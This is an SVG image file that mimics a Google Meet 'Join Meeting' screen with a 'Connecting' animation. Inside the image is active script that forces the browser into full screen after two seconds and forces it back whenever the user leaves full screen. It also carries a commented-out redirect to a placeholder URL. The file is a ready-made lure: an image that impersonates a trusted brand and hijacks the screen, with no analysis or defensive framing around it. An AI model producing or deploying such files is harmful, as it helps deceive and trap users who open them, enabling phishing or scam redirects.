
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 300" width="400" height="300">
  <!-- Background and styling -->
  <rect width="100%" height="100%" fill="#f1f3f4" />
  
  <!-- Google Meet-like header -->
  <text x="20" y="40" font-family="Arial" font-size="18" fill="#202124">Join Meeting</text>
  
  <!-- Connecting button with animation -->
  <g id="connectingGroup" transform="translate(100, 100)">
    <rect width="200" height="40" rx="4" fill="#4285f4" />
    <text x="10" y="25" font-family="Arial" font-size="14" fill="white">Connecting</text>
    <!-- Animated dots -->
    <circle cx="140" cy="20" r="2" fill="white">
      <animate attributeName="opacity" values="0;1;0" dur="1.5s" repeatCount="indefinite" />
    </circle>
    <circle cx="150" cy="20" r="2" fill="white">
      <animate attributeName="opacity" values="0;1;0" dur="1.5s" repeatCount="indefinite" begin="0.3s" />
    </circle>
    <circle cx="160" cy="20" r="2" fill="white">
      <animate attributeName="opacity" values="0;1;0" dur="1.5s" repeatCount="indefinite" begin="0.6s" />
    </circle>
  </g>
  
  <!-- Script for auto full-screen and optional redirect -->
  <script type="text/javascript"><![CDATA[
    // Function to request full-screen (triggers after a short delay for "connecting" effect)
    function goFullScreen() {
      var elem = document.documentElement;
      if (elem.requestFullscreen) {
        elem.requestFullscreen();
      } else if (elem.mozRequestFullScreen) { // Firefox
        elem.mozRequestFullScreen();
      } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, Opera
        elem.webkitRequestFullscreen();
      } else if (elem.msRequestFullscreen) { // IE/Edge
        elem.msRequestFullscreen();
      }
    }

    // Auto-trigger full-screen after 2 seconds (simulates connecting, but note: may require user interaction in some browsers)
    setTimeout(goFullScreen, 2000);

    // Optional: Auto-redirect after full-screen (uncomment if needed)
    // setTimeout(function() { window.location.href = 'https://your-redirect-url.com'; }, 4000);

    // Attempt to re-enter full-screen if exited
    document.addEventListener('fullscreenchange', function() {
      if (!document.fullscreenElement) {
        goFullScreen();
      }
    });
  ]]></script>
</svg>
